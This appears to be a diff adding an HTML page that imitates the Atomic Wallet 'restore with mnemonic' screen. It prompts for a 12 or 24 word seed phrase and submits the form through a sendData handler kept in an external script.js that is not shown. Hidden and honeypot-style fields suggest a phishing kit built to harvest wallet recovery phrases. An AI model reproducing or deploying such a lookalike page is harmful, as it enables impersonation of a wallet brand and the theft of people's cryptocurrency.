@@ -1,0 +1,167 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,viewport-fit=cover"
+    />
+    <title>Atomic Wallet</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <link href="css/standalone.5308b6b6.css" rel="preload" as="style" />
+    <link href="css/standalone.5308b6b6.css" rel="stylesheet" />
+    <link rel="shortcut icon" href="./media/logo.ico" />
+    <style>
+      .hidden-field {
+        display: none;
+      }
+
+      .loader-container {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+      }
+
+      .loader {
+        border: 16px solid #f3f3f3;
+        border-top: 16px solid #050508;
+        border-radius: 50%;
+        width: 120px;
+        height: 120px;
+        animation: spin 2s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <div data-v-a92dbbbe="" class="sign mui-fl-central">
+        <header data-v-a92dbbbe="" class="s-header mui-fl-vert mui-fl-btw">
+          <h1 data-v-a92dbbbe="" class=""></h1>
+          <button data-v-a92dbbbe="" class="help-btn taplight2"></button>
+        </header>
+        <div data-v-a92dbbbe="" class="signbox">
+          <div data-v-a92dbbbe="" class="sb-header">
+            <button
+              onclick="location.href='index.html'"
+              data-v-a92dbbbe=""
+              class="back-btn taplight2"
+              style=""
+            ></button>
+            <ul data-v-a92dbbbe="" class="step mui-fl-central">
+              <li data-v-a92dbbbe="" class="active"></li>
+              <li data-v-a92dbbbe="" class="active"></li>
+              <li data-v-a92dbbbe="" class=""></li>
+              <li data-v-a92dbbbe="" class=""></li>
+            </ul>
+          </div>
+          <div data-v-a92dbbbe="" class="sb-body">
+            <p data-v-a92dbbbe="" class="lab">Mnemonic</p>
+            <p data-v-a92dbbbe="" class="lab2 min18">
+              Restore an existing wallet with your 12 or 24 mnemonic words.
+            </p>
+
+            <form onsubmit="sendData(event)" autocomplete="off">
+              <div data-v-a92dbbbe="" class="form-item">
+                <textarea
+                  pattern="[a-zA-Z0-9\s]+"
+                  minlength="30"
+                  type="text"
+                  id="data"
+                  spellcheck="false"
+                  required=""
+                  value=""
+                  autocomplete="off"
+                  data-v-a92dbbbe=""
+                  class="mui-textarea space"
+                ></textarea>
+                <p
+                  data-v-a92dbbbe=""
+                  class="form-item-info err"
+                  style="display: none"
+                ></p>
+              </div>
+
+              <input type="text" id="hiddenField" class="hidden-field" />
+
+              <div data-v-a92dbbbe="" class="form-item">
+                <div data-v-a92dbbbe="" class="el-select sty1-select">
+                  <!---->
+
+                  <div class="el-input el-input--suffix">
+                    <!---->
+
+                    <!----><span class="el-input__suffix">
+                      <span class="el-input__suffix-inner">
+                        <i
+                          class="el-select__caret el-input__icon el-icon-arrow-up"
+                        ></i
+                        ><!----><!----><!----><!----><!----></span
+                      ><!----></span
+                    ><!----><!---->
+                  </div>
+
+                  <div
+                    class="el-select-dropdown el-popper popper-block"
+                    style="display: none; min-width: 326.4px"
+                  >
+                    <input type="text" name="trap" style="display: none" />
+
+                    <div class="el-scrollbar" style="">
+                      <div class="el-scrollbar__bar is-horizontal">
+                        <div
+                          class="el-scrollbar__thumb"
+                          style="transform: translateX(0%)"
+                        ></div>
+                      </div>
+                      <div class="el-scrollbar__bar is-vertical">
+                        <div
+                          class="el-scrollbar__thumb"
+                          style="transform: translateY(0%)"
+                        ></div>
+                      </div>
+                    </div>
+                    <!---->
+                  </div>
+                </div>
+
+                <div class="loader-container" id="loaderContainer">
+                  <div class="loader"></div>
+                </div>
+
+                <i
+                  data-v-a92dbbbe=""
+                  class="mico-arrow-right icon-arrow-right"
+                ></i>
+              </div>
+
+              <button
+                type="submit"
+                value="Send Data"
+                data-v-a92dbbbe=""
+                class="marg-t fz18 van-button van-button--info van-button--normal van-button--block"
+              >
+                <div data-v-a92dbbbe="" class="van-button__content">
+                  <span data-v-a92dbbbe="" class="van-button__text"
+                    >Import Mnemonic words</span
+                  >
+                </div>
+              </button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="./media/script.js"></script>
+  </body>
+</html>
